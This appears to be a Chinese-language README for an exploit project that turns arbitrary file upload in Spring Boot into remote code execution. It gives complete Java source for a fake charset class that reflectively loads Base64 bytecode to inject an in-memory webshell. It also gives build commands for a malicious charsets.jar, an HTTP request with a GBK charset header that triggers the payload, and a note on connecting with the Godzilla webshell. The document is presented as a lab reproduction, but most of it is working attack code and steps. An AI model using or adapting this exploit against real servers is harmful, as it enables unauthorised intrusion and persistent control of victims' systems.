**概述**

原作者：https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks

改进：将IBM33722.java改为了字节码加载，可注入内存马

```java
package sun.nio.cs.ext;

import java.util.Base64;

public class IBM33722 {
    private static final String CLASS_BASE64 = "字节码";

    static {
        loadBytecode();
    }

    public IBM33722() {
        loadBytecode();
    }

    private static void loadBytecode() {
        try {
            byte[] classBytes = Base64.getDecoder().decode(CLASS_BASE64);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, int.class, int.class
            );
            defineClassMethod.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClassMethod.invoke(
                    Thread.currentThread().getContextClassLoader(),
                    classBytes, 0, classBytes.length
            );
            clazz.newInstance();

        } catch (Throwable t) {
        }
    }
}
```

SpringFileWriteRCE为漏洞环境，包含upload和aspectJ反序列化场景

**复现**

将漏洞环境打包好后进入容器启动项目

当前我的jdk路径：/usr/lib/jvm/jdk1.8.0_201/

![image-20260115153911229](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260115153911229.png)

用upload.py上传提前打包好的charsets.jar文件

打包流程：

字节码可以用jmg生成，生成后粘贴到IBM33722.java，然后切到目录charsets\src，编译.java文件并打包

```
javac sun\nio\cs\ext\IBM33722.java
javac sun\nio\cs\ext\ExtendedCharsets.java
jar -cvf charsets.jar sun META-INF
```

上传后发送如下数据包触发恶意代码

```
GET / HTTP/1.1
Host: 192.168.239.139:8081
Accept: text/html;charset=GBK
```

![image-20260115155047491](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260115155047491.png)

此时哥斯拉连接

![image-20260115155112622](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260115155112622.png)